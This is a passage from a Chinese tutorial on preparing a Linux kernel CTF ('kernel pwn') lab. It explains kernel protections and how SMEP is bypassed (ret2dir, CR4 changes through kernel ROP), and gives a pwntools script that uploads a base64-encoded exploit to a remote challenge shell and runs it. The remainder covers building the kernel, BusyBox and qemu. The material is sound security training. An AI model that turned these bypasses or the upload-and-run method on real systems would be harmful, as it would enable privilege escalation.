PROTECTOR\n类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 kernel panic。内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值。\n\nSMAP&#x2F;SMEP\nSMAP 即管理模式访问保护（Supervisor Mode Access Prevention），SMEP 即管理模式执行保护（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止内核空间直接访问 &#x2F; 执行用户空间的数据，完全地将内核空间与用户空间相分隔开，用以防范 ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。\nSMEP 保护的绕过有以下两种方式：\n\n利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 ret2dir 。\nIntel 下系统根据 CR4 控制寄存器的第 20 位标识是否开启 SMEP 保护（1 为开启，0 为关闭），若是能够通过 kernel ROP 改变 CR4 寄存器的值便能够关闭 SMEP 保护，完成 SMEP-bypass，接下来就能够重新进行 ret2usr，但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式 。\n\n\nKPTI\nKPTI 即 内核页表隔离（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。\n需要进行说明的是，在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，但两张页表都有着对用户内存空间的完整映射，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局。\n\n\nKPTI 的发明主要是用来修复一个史诗级别的 CPU 硬件漏洞：Meltdown。简单理解就是利用 CPU 流水线设计中（乱序执行与预测执行）的漏洞来获取到用户态无法访问的内核空间的数据，属于侧信道攻击的一种。\nKPTI 同时还令内核页表中属于用户地址空间的部分不再拥有执行权限，这使得 ret2usr 彻底成为过去式。\n\nHardened Usercopy\nhardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界：\n\n读取的数据长度是否超出源 object 范围。\n写入的数据长度是否超出目的 object 范围。\n\n这一保护被用于 copy_to_user() 与 copy_from_user() 等数据交换 API 中，不过这种保护 不适用于内核空间内的数据拷贝 ，这也是目前主流的绕过手段。\n\nHardened freelist\n类似于 glibc 2.32 版本引入的保护，在开启这种保护之前，slub 中的 free object 的 next 指针直接存放着 next free object 的地址，攻击者可以通过读取 freelist 泄露出内核线性映射区的地址，在开启了该保护之后 free object 的 next 指针存放的是由以下三个值进行异或操作后的值：\n\n当前 free object 的地址。\n下一个 free object 的地址。\n由 kmem_cache 指定的一个 random 值。\n\n攻击者至少需要获取到第一与第三个值才能篡改 freelist，这无疑为对 freelist 的直接利用增添不少难度。\n\nRandom freelist\n这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object 之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址。\n需要注意的是这种保护发生在 slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO。\n\n\nCONFIG_INIT_ON_ALLOC_DEFAULT_ON\n当编译内核时开启了这个选项时，在内核进行 “堆内存” 分配时（包括 buddy system 和 slab allocator），会将被分配的内存上的内容进行清零，从而防止了利用未初始化内存进行数据泄露的情况。\n\n\n二、Kernel PWN 题型（一）常规题目文件传统的 kernel pwn 题目通常会给以下三个文件：\n\nboot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关\nbzImage: compressed kernel binary\nrootfs.cpio: 文件系统映像\n\n以 CISCN2017 - babydriver 为例：\nCISCN2017_babydriver [master●] lsbabydriver.tarCISCN2017_babydriver [master●] x babydriver.tarboot.shbzImagerootfs.cpioCISCN2017_babydriver [master●] lsbabydriver.tar  boot.sh  bzImage  rootfs.cpioCISCN2017_babydriver [master●] file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGACISCN2017_babydriver [master●] file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size 2844672CISCN2017_babydriver [master●] file boot.shboot.sh: Bourne-Again shell script, ASCII text executableCISCN2017_babydriver [master●] bat boot.sh ───────┬─────────────────────────────────────────────────────────────────────────────────       │ File: boot.sh───────┼─────────────────────────────────────────────────────────────────────────────────   1   │ #!/bin/bash   2   │    3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 ro       │ ot=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographi       │ c  -smp cores=1,threads=1 -cpu kvm64,+smep───────┴─────────────────────────────────────────────────────────────────────────────────\n\n其中主要的 qemu 参数含义如下：\n\n-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统\n-kernel bzImage，使用 bzImage 作为 kernel 映像\n-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep\n-m 64M，设置虚拟 RAM 为 64M，默认为 128M\n\n其他的 qemu 参数可以通过 –help 查看。\n（二）远程上传通常情况下我们需要将在本地编写好的 exploit 程序进行静态编译并传输到远程，比较通用的办法便是将 exploit 进行 base64 编码后传输，可参考如下脚本：\nfrom pwn import *import base64#context.log_level = &quot;debug&quot;with open(&quot;./exp&quot;, &quot;rb&quot;) as f:    exp = base64.b64encode(f.read())p = remote(&quot;127.0.0.1&quot;, 11451)#p = process(&#x27;./run.sh&#x27;)p.sendline()p.recvuntil(&quot;/ $&quot;)count = 0for i in range(0, len(exp), 0x200):    p.sendline(&quot;echo -n \\&quot;&quot; + exp[i:i + 0x200].decode() + &quot;\\&quot; &gt;&gt; /tmp/b64_exp&quot;)    count += 1    log.info(&quot;count: &quot; + str(count))for i in range(count):    p.recvuntil(&quot;/ $&quot;)p.sendline(&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;)p.sendline(&quot;chmod +x /tmp/exploit&quot;)p.sendline(&quot;/tmp/exploit &quot;)p.interactive()\n\n\n\n三、环境搭建（一）内核源码下载内核源码，尔后编译生成内核镜像文件（bzImage）\n\nhttps://www.kernel.org/\nhttps://mirrors.tuna.tsinghua.edu.cn/kernel/\n\n\n内核主要有以下几种类别：\n\nPrepatch (RC) ：主线内核的预发布版本，包含了最新的待测试的内核特性，由 Linus Torvalds 维护。\nMainline：主线内核版本，RC 版本的新特性经过测试后便会合并到主线，每 9～10 周发一个版本，由 Linus Torvalds 维护。\nStable：主线内核发布后便会变为 Stable 状态，其仅会被 stable kernel 维护者从主线树后向移植一些漏洞修复，直到下个内核版本释出。Stable kernel 根据需要进行更新，通常是一周一次。\nLongterm：部分内核版本会被选作长期支持版（LTS），相比起 Stable 内核有着更久的支持时长，通常仅会被后向移植重要的漏洞修复，且更新周期较慢（尤其是对于更老的版本）。\n\n\n╭─ ~/kernels/linux-6.18 ▓▒░───────────────────────────────────────────────░▒▓ ✔  base Py  at 00:20:55╰─ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.18.tar.xz--2026-01-02 00:21:00--  https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.18.tar.xzResolving mirrors.tuna.tsinghua.edu.cn (mirrors.tuna.tsinghua.edu.cn)... 101.6.15.130, 2402:f000:1:400::2Connecting to mirrors.tuna.tsinghua.edu.cn (mirrors.tuna.tsinghua.edu.cn)|101.6.15.130|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 154309096 (147M) [application/octet-stream]Saving to: ‘linux-6.18.tar.xz’linux-6.18.tar.xz          100%[=====================================&gt;] 147.16M  5.62MB/s    in 24s2026-01-02 00:21:24 (6.04 MB/s) - ‘linux-6.18.tar.xz’ saved [154309096/154309096]\n\n（二）内核签名验证导入 Linus Torvalds 和 Greg Kroah-Hartman 的公钥：\n╭─ ~/kernels/linux-6.18 ▓▒░────────────────────────────────────░▒▓ ✔  took 12s  base Py  at 00:24:49╰─ gpg2 --locate-keys torvalds@kernel.org gregkh@kernel.orggpg: directory &#x27;/home/user/.gnupg&#x27; createdgpg: keybox &#x27;/home/user/.gnupg/pubring.kbx&#x27; createdgpg: /home/user/.gnupg/trustdb.gpg: trustdb createdgpg: key 38DBBDC86092693E: public key &quot;Greg Kroah-Hartman &lt;gregkh@kernel.org&gt;&quot; importedgpg: Total number processed: 1gpg:               imported: 1gpg: key 79BE3E4300411886: public key &quot;Linus Torvalds &lt;torvalds@kernel.org&gt;&quot; importedgpg: Total number processed: 1gpg:               imported: 1pub   rsa4096 2011-09-23 [SC]      647F28654894E3BD457199BE38DBBDC86092693Euid           [ unknown] Greg Kroah-Hartman &lt;gregkh@kernel.org&gt;sub   rsa4096 2011-09-23 [E]pub   rsa2048 2011-09-20 [SC]      ABAF11C65A2970B130ABE3C479BE3E4300411886uid           [ unknown] Linus Torvalds &lt;torvalds@kernel.org&gt;sub   rsa2048 2011-09-20 [E]\n\n下载内核签名进行校验：\n╭─ ~/kernels/linux-6.18 ▓▒░─────────────────────────────────────░▒▓ ✔  took 4s  base Py  at 00:26:05╰─ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.18.tar.sign--2026-01-02 00:26:40--  https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.18.tar.signResolving mirrors.tuna.tsinghua.edu.cn (mirrors.tuna.tsinghua.edu.cn)... 101.6.15.130, 2402:f000:1:400::2Connecting to mirrors.tuna.tsinghua.edu.cn (mirrors.tuna.tsinghua.edu.cn)|101.6.15.130|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 985 [application/octet-stream]Saving to: ‘linux-6.18.tar.sign’linux-6.18.tar.sign.1      100%[=====================================&gt;]     985  --.-KB/s    in 0s2026-01-02 00:28:41 (744 MB/s) - ‘linux-6.18.tar.sign.1’ saved [985/985]╭─ ~/kernels/linux-6.18 ▓▒░─────────────────────────────────────────────░▒▓ 2 ✘  base Py  at 00:27:34╰─ unxz ./linux-6.18.tar.xz╭─ ~/kernels/linux-6.18 ▓▒░─────────────────────────────────────░▒▓ ✔  took 5s  base Py  at 00:27:55╰─ lslinux-6.18  linux-6.18.tar  linux-6.18.tar.sign╭─ ~/kernels/linux-6.18 ▓▒░───────────────────────────────────────────────░▒▓ ✔  base Py  at 00:27:57╰─ gpg2 --verify linux-6.18.tar.signgpg: assuming signed data in &#x27;linux-6.18.tar&#x27;gpg: Signature made Mon Dec  1 13:33:58 2025 CSTgpg:                using RSA key 647F28654894E3BD457199BE38DBBDC86092693Egpg: Good signature from &quot;Greg Kroah-Hartman &lt;gregkh@kernel.org&gt;&quot; [unknown]gpg: WARNING: This key is not certified with a trusted signature!gpg:          There is no indication that the signature belongs to the owner.Primary key fingerprint: 647F 2865 4894 E3BD 4571  99BE 38DB BDC8 6092 693E╭─ ~/kernels/linux-6.18 ▓▒░─────────────────────────────────────────────░▒▓ 1 ✘  base Py  at 00:33:48╰─ gpg2 --tofu-policy good 6092693Egpg: Setting TOFU trust policy for new binding &lt;key: 647F28654894E3BD457199BE38DBBDC86092693E, user id: Greg Kroah-Hartman &lt;gregkh@kernel.org&gt;&gt; to good.\n\n（三）编译选项图形化配置\n在内核源码目录下使用如下命令进入图形化的内核配置面板，这也是最常用的内核配置方法 ，其会读取 .config 文件的配置并允许我们在图形化的界面中进行修改，并在该文件不存在时则是会调用 make defconfig 先生成一份默认配置：\nmake menuconfig\n\n默认配置\nmake defconfig 生成一份默认的内核配置，其会读取 arch/架构/configs 目录下的配置文件作为基础配置，其包括一份默认启用的内核功能以及驱动编译配置等，这通常会编译上绝大部分常见的驱动，并根据当前系统环境进行相应的微调\nmake defconfig╭─ ~/kernels/linux-6.18/linux-6.18 ▓▒░─────────────────────░▒▓ INT ✘  took 13s  base Py  at 00:51:51╰─ make defconfig*** Default configuration is based on &#x27;x86_64_defconfig&#x27;## configuration written to .config#\n\n手动配置\n逐条询问每一条内核配置是否开启，用户需要在命令行逐条回复 y （编译进内核）、m （作为内核模块编译，部分配置会提供该选项） 、n（不编译）\nmake config\n\n检测并仅编译内核模块\n动态检测当前环境所包含的内核模块（lsmod 命令所显示的内核模块），并在内核编译过程中仅编译这些模块，这通常适合嵌入式开发等需要定制化精简与裁剪内核的场景， 但往往不适合通用场景 ：\n# 任选一条make localyesconfig # 将驱动编译到内核当中make localmodconfig # 让驱动以独立内核模块的形式存在\n\n尽可能全满启用\n如下命令（任选一条）会尽可能多地启用可用的内核选项，在生成的配置中包含了尽可能多的内核特性与驱动：\nmake allyesconfig # 将驱动编译到内核当中，基于实际使用情况智能配置make allmodconfig # 让驱动以独立内核模块的形式存在，无脑启用所有功能，适合测试而非实际使用\n\n调试相关选项\n\nKernel hacking —&gt; Kernel debugging\nKernel hacking —&gt; Compile-time checks and compiler options —&gt; Compile the kernel with debug info\nKernel hacking —&gt; Generic Kernel Debugging Instruments –&gt; KGDB: kernel debugger\nkernel hacking —&gt; Compile the kernel with frame pointers\n\n（四）编译内核我们通常要获得的是压缩后的内核镜像文件 bzImage ，因此我们在源码目录下使用如下命令进行编译：\nmake bzImagemake -j(nproc) bzImage\n\n\n此外，可以:通过 CC= 来指定所使用的编译器，通过 LD= 来指定所使用的链接器，通过 LLVM= 来指定所使用的 LLVM 工具链所在目录。\n\n  ......  OBJCOPY arch/x86/boot/vmlinux.bin  AS      arch/x86/boot/header.o  LD      arch/x86/boot/setup.elf  OBJCOPY arch/x86/boot/setup.bin  BUILD   arch/x86/boot/bzImageKernel: arch/x86/boot/bzImage is ready  (#1)╭─ ~/kernels/linux-6.18/linux-6.18 ▓▒░───────────────────────░▒▓ ✔  took 5m 6s  base Py  at 01:28:20╰─ lsCOPYING        MAINTAINERS  built-in.a  init      modules.builtin          security  vmlinux.aCREDITS        Makefile     certs       io_uring  modules.builtin.modinfo  sound     vmlinux.oDocumentation  README       crypto      ipc       net                      tools     vmlinux.symversKbuild         System.map   drivers     kernel    rust                     usr       vmlinux.unstrippedKconfig        arch         fs          lib       samples                  virtLICENSES       block        include     mm        scripts                  vmlinux\n\n我们主要关注于编译产物中的两个文件：\n\nvmlinux：编译生成的 ELF 格式的原始内核镜像文件，通常位于源码根目录下。\nbzImage：前者进行压缩后的内核镜像文件，通常位于 arch/架构/boot/bzImage （注意对于 x86-64 而言仍是 x86 目录）。\n\n常见内核文件格式的介绍：\n\nbzImage：目前主流的 kernel 镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB） Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip 解压缩的代码，所以我们不能用 gunzip 来解压缩。\nzImage：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。\nvmlinuz：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是 bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 &#x2F;boot 目录下。该目录包含了启动系统时所需要的文件。\nvmlinux：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。\nvmlinux.bin：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：objcopy -O binary vmlinux vmlinux.bin。\nuImage：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。\n\n（五）下载内核可以自己下载发行版仓库中已有的内核镜像，而不需要自行编译一整套Linux内核，Ubuntu为例：\nsudo apt search linux-image- sudo apt download linux-image-5.8.0-43-genericdpkg -X ./linux-image-5.8.0-43-generic_5.8.0-43.49~20.04.1_amd64.deb extract././boot/./boot/vmlinuz-5.8.0-43-generic./usr/./usr/share/./usr/share/doc/./usr/share/doc/linux-image-5.8.0-43-generic/./usr/share/doc/linux-image-5.8.0-43-generic/changelog.Debian.gz./usr/share/doc/linux-image-5.8.0-43-generic/copyright\n\n其中的 ./boot/vmlinuz-5.8.0-43-generic 便是bzImage内核镜像文件\n四、文件系统构建（BusyBox）BusyBox 是一个集成了三百多个最常用 Linux 命令和工具的软件，包含了例如 ls 、cat 和 echo 等常见的命令，相比起各大发行版中常用的 GNU core utilities ，BusyBox 更加的轻量化，且更容易进行配置，因此我们将用 busybox 为我们的内核提供一个基本的用户环境。\n（一）下载编译BusyBox\nhttps://busybox.net/downloads/\n\n下载、解压、配置编译选项\nwget https://busybox.net/downloads/busybox-1.36.0.tar.bz2tar -jxvf busybox-1.36.0.tar.bz2make menuconfig\n\n勾选 Settings —&gt; Build static binary file (no shared lib)以构建不依赖于 libc 的静态编译版本，因为我们的简易内核环境中只有 BusyBox，没有额外的 libc 等运行支持。\n\n可选项：在 Linux System Utilities 中取消选中 Support mounting NFS file systems on Linux &lt;2.6.23 (NEW)；在 Networking Utilities 中取消选中 inetd。\n\n编译\nmake -j$(nproc)make install\n\n如果遇到error: ‘TCF_CBQ_LSS_BOUNDED’ undeclared的错误，只需要将networking/tc.c删除即可通过bian’yi\n\nBusyBox编译时出错_busybox tc.c-CSDN博客\n\n编译完成后会生成一个 _install 目录，接下来我们将会用它来构建我们的文件系统\n（二）配置文件系统初始化文件系统： _install 目录下创建基本的文件系统结构：\ncd _installmkdir -pv &#123;bin,sbin,etc,proc,sys,dev,home/ctf,root,tmp,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;touch etc/inittabmkdir etc/init.dtouch etc/init.d/rcS\n\n配置初始化脚本： ./etc/inittab 中写入如下内容：\n::sysinit:/etc/init.d/rcS::askfirst:/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init\n\n在上面的文件中指定了系统初始化脚本为 etc/init.d/rcS，因此接下来我们配置这个文件写入如下内容，主要是挂载各种文件系统，以及设置各目录的权限，并创建一个非特权用户：\n#!/bin/shchown -R root:root /chmod 700 /rootchown -R ctf:ctf /home/ctfmount -t proc none /procmount -t sysfs none /sysmount -t tmpfs tmpfs /tmpmkdir /dev/ptsmount -t devpts devpts /dev/ptsecho 1 &gt; /proc/sys/kernel/dmesg_restrictecho 1 &gt; /proc/sys/kernel/kptr_restrictecho -e &quot;\\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\\n&quot;cd /home/ctfsu ctf -c shpoweroff -d 0  -f\n\n为这个脚本添加可执行权限，该脚本通常用作我们自定义的环境初始化脚本：\nchmod +x ./etc/init.d/rcS\n\n接下来我们配置用户组相关权限，在这里建立了两个用户组 root 和 ctf ，以及两个用户 root 和 ctf，并配置了一条文件系统挂载项：\necho &quot;root:x:0:0:root:/root:/bin/sh&quot; &gt; etc/passwdecho &quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot; &gt;&gt; etc/passwdecho &quot;root:x:0:&quot; &gt; etc/groupecho &quot;ctf:x:1000:&quot; &gt;&gt; etc/groupecho &quot;none /dev/pts devpts gid=5,mode=620 0 0&quot; &gt; etc/fstab\n\n（三）打包文件系统这里提供三种不同的格式： qcow2 、 ext4 、 cpio\nQCOW2格式\nQEMU Copy-on-Write version 2 QCOW2 是 QEMU 的一种常用的硬盘镜像格式，我们可以使用如下命令创建一个指定大小的 QCOW2 镜像文件（创建一个 8MB 的空白虚拟磁盘，这是虚拟机启动需要的”硬盘”，但现在是空的）：\nqemu-img create -f qcow2 rootfs.qcow2 8M╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 12:59:37╰─ qemu-img create -f qcow2 rootfs.qcow2 8MFormatting &#x27;rootfs.qcow2&#x27;, fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=8388608 lazy_refcounts=off refcount_bits=16\n\n之后我们可以通过如下命令将其挂载为网络块设备（**将镜像文件虚拟成硬盘设备，让 Linux 系统能像操作真实硬盘一样操作镜像文件，就像把 U盘插入电脑，系统识别为 /dev/sdb**）：\n\n在此之前你可能需要手动启用如下内核模块：\nsudo modprobe nbd\n\nsudo qemu-nbd -c /dev/nbd0 ./rootfs.qcow2\n\n然后将其格式化为自己想要的文件系统，例如最常用的 ext4（在虚拟硬盘上创建 ext4 文件系统，没有文件系统的硬盘无法存储文件，类似新买的 U盘需要格式化才能用）：\nsudo mkfs.ext4 /dev/nbd0╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 13:01:42╰─ sudo mkfs.ext4 /dev/nbd0mke2fs 1.47.0 (5-Feb-2023)Discarding device blocks: doneCreating filesystem with 2048 4k blocks and 2048 inodesAllocating group tables: doneWriting inode tables: doneCreating journal (1024 blocks): doneWriting superblocks and filesystem accounting information: done\n\n之后就是常规的挂载（将格式化好的文件系统挂载到 /mnt，通过 /mnt目录访问和修改虚拟硬盘内容，类似Windows 中打开”我的电脑”访问 U盘）：\nsudo mount /dev/nbd0 /mnt\n\n然后把前面我们构建的文件系统内容拷贝进去（将预先准备好的根文件系统复制到镜像中，让虚拟硬盘包含完整的操作系统文件）：\n\nroot:root：系统文件需要 root 权限\nchmod 700 &#x2F;mnt&#x2F;root：保护 root 家目录\n1000:1000：设置 ctf 用户权限\n\nsudo cp -auv _install/* /mntsudo chown -R root:root /mntsudo chmod 700 /mnt/rootsudo chown -R 1000:1000 /mnt/home/ctf/\n\n最后常规卸载并解绑 nbd 即可：\nsudo umount /mntsyncsudo qemu-nbd -d /dev/nbd0\n\n优点：\n\n方便扩展（qemu-img resize）\n快照功能（开发测试）\n动态空间（节省存储）\n支持多种特性（压缩、加密）\n\n适用：\n\n虚拟机系统盘\n开发测试环境\n需要频繁修改的系统\n\next4镜像格式\n这里也可以将文件系统打包为 ext4 镜像格式，首先创建空白 ext4 镜像文件，这里 bs 表示块大小，count 表示块的数量：\ndd if=/dev/zero of=rootfs.img bs=1M count=32\n\n将其格式化为 ext4 格式\nmkfs.ext4 rootfs.img \n\n挂载镜像，将文件拷贝进去即可：\nmkdir tmpsudo mount rootfs.img ./tmp/sudo cp -rfp _install/* ./tmp/sudo chown -R root:root ./tmp/sudo chmod 700 ./tmp/rootsudo chown -R 1000:1000 ./tmp/home/ctf/sudo umount ./tmp╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:45:14╰─ dd if=/dev/zero of=rootfs.img bs=1M count=3232+0 records in32+0 records out33554432 bytes (34 MB, 32 MiB) copied, 0.0573243 s, 585 MB/s╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:47:39╰─ mkfs.ext4 rootfs.imgmke2fs 1.47.0 (5-Feb-2023)Discarding device blocks: doneCreating filesystem with 8192 4k blocks and 8192 inodesAllocating group tables: doneWriting inode tables: doneCreating journal (1024 blocks): doneWriting superblocks and filesystem accounting information: done╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:47:48╰─ mkdir tmp╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:48:01╰─ sudo mount rootfs.img ./tmp[sudo] password for user:╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:48:13╰─ sudo cp -rfp ../busybox-1.36.0/_install/* ./tmp╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:48:30╰─ sudo chown -R root:root ./tmp/╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:48:42╰─ sudo chmod 700 ./tmp/root╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:48:52╰─ sudo chown -R 1000:1000 ./tmp/home/ctf╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────░▒▓ ✔  base Py  at 00:49:05╰─ sudo umount ./tmp\n\n优点：\n\n直接写入物理设备\n无需中间转换\n通用兼容性好\n性能接近原生\n\n适用：\n\nSD卡镜像\nUSB启动盘\n物理设备部署\n简单测试环境\n\ncpio镜像格式\n在 _install 目录下使用如下命令打包文件系统为 cpio 格式\nfind . | cpio -o --format=newc &gt; ../rootfs.cpio\n\n也可以这么写\nfind . | cpio -o -H newc &gt; ../rootfs.cpio\n\n\n位置是随便选的，可以将之放到自己喜欢的位置\n\n还可以使用如下的命令重新解包文件系统\ncpio -idv &lt; ./rootfs.cpio\n优点：\n\n内核直接支持\n启动速度最快\n无需磁盘驱动\n最小化部署\n\n适用：\n\ninitrd&#x2F;initramfs\n系统修复盘\n内核调试环境\n资源受限系统\n\n\n\n\n特性\nQCOW2\next4 镜像\ncpio\n\n\n\n主要用途\n虚拟机硬盘镜像\n磁盘分区镜像\n初始内存文件系统\n\n\n文件系统\n可包含任何（如ext4）\n必须是ext4\n无文件系统概念\n\n\n存储方式\n稀疏文件，写时复制\n原始二进制镜像\n归档格式\n\n\n可修改性\n方便修改和扩展\n修改需挂载\n解包→修改→重打包\n\n\n压缩支持\n内置压缩\n无，需外部压缩\n可外部gzip压缩\n\n\n启动方式\nQEMU硬盘启动\nQEMU硬盘启动\n内核initrd启动\n\n\n典型大小\n几百MB-几十GB\n几MB-几GB\n几MB-几十MB\n\n\n五、运行环境搭建QEMU 是一款开源的虚拟机软件，支持多种不同架构的模拟（Emulation）以及配合 kvm 完成当前架构的虚拟化（Virtualization）的特性，是当前最火热的开源虚拟机软件。\n通过apt安装\n# 更新软件包列表sudo apt update# 安装 QEMU 完整套件sudo apt install qemu-system qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virt-manager\n\n启动脚本boot.sh\n#!/bin/shqemu-system-x86_64 \\    -m 128M \\    -kernel ./bzImage \\    -initrd  ./rootfs.cpio \\    -monitor /dev/null \\    -append &quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot; \\    -cpu kvm64,+smep \\    -smp cores=2,threads=1 \\    -nographic \\    -s\n\n\n-m：虚拟机内存大小\n\n-kernel：内核镜像路径\n\n-initrd：初始文件系统路径，cpio 文件系统会被载入到内存当中（initramfs）\n\n-monitor：将监视器重定向到主机设备 /dev/null，这里重定向至 null 主要是防止CTF 中被人通过监视器直接拿 flag\n\n-append：附加参数选项\n\nkaslr：开启内核地址随机化，你也可以改为 nokaslr 进行关闭以方便我们进行调试\nrdinit：指定初始启动进程，这里我们指定了 /sbin/init 作为初始进程，其会默认以 /etc/init.d/rcS 作为启动脚本\nloglevel=3 &amp; quiet：不输出log\nconsole=ttyS0：指定终端为 /dev/ttyS0，这样一启动就能进入终端界面\n\n\n-cpu：设置CPU选项，在这里开启了smep保护\n\n-smp：设置对称多处理器配置，这里设置了两个核心，每个核心一个线程\n\n-nographic：不提供图形化界面，此时内核仅有串口输出，输出内容会被 QEMU 重定向至我们的终端\n\n-s：相当于-gdb tcp::1234的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试\n\n\n#!/bin/bashqemu-system-x86_64 \\    -m 256M \\    -cpu kvm64,+smep,+smap \\    -smp cores=2,threads=2 \\    -kernel bzImage \\    -hda ./rootfs.img \\    -nographic \\    -monitor /dev/null \\    -append &quot;console=ttyS0 root=/dev/sda rw rdinit=/sbin/init kaslr pti=on quiet oops=panic panic=1&quot; \\    -no-reboot \\\t-s\n\n\n-hda：我们将 ext4 镜像挂载为一个真正的硬盘设备，优点在于更贴近真实环境（同时 flag 不会被在内存中泄漏），缺点在于所有对文件系统的操作都会“落盘”\n-append：我们修改了 root=/dev/sda rw ，因为 ext4 镜像被挂载为一个 SATA 硬盘，而 Linux 中第一个 SATA 硬盘的路径为 /dev/sda ，因此我们将根文件系统路径指向设备路径，并给予可读写权限\n\n#!/bin/shqemu-system-x86_64 \\    -m 128M \\    -kernel ./bzImage \\    -hda ./rootfs.qcow2 \\    -monitor /dev/null \\    -append &quot;root=/dev/sda rw rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot; \\    -cpu kvm64,+smep \\    -smp cores=2,threads=1 \\    -nographic \\    -snapshot \\    -s\n\n\n-hda：文件系统路径，我们将 qcow2 镜像挂载为一个真正的硬盘设备，优点在于更贴近真实环境。\n-snapshot：使用快照的方式启动，这样在虚拟机当中对文件系统的修改不会 “落盘”。\n\n共享文件夹查看编译的内核是否支持9p共享文件夹\n╭─ ~/kernel_modules/src ▓▒░─────────────────────────────────────────────░▒▓ 1 ✘  base Py  at 21:13:05╰─ grep -E &quot;9P|VIRTIO&quot; ../../kernels/linux-6.18/linux-6.18/.configCONFIG_NET_9P=yCONFIG_NET_9P_FD=yCONFIG_NET_9P_VIRTIO=y\n\nqemu的核心启动参数\n-fsdev local,id=&lt;id&gt;,path=&lt;宿主机路径&gt;,security_model=&lt;安全模式&gt;-device virtio-9p-pci,fsdev=&lt;fsdev_id&gt;,mount_tag=&lt;挂载标签&gt;# 基本示例qemu-system-x86_64 \\    -fsdev 